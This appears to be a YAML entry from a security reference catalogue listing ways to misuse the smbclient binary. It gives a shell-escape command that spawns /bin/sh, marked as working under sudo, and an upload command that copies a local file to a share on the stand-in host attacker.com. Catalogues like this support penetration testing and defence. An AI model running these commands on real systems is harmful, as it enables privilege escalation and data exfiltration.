            shell:
            - code: 'smbclient ''\\host\share''

                !/bin/sh'
              comment: A valid SMB/CIFS server must be available.
              contexts:
                sudo: null
                unprivileged: null
            upload:
            - code: smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
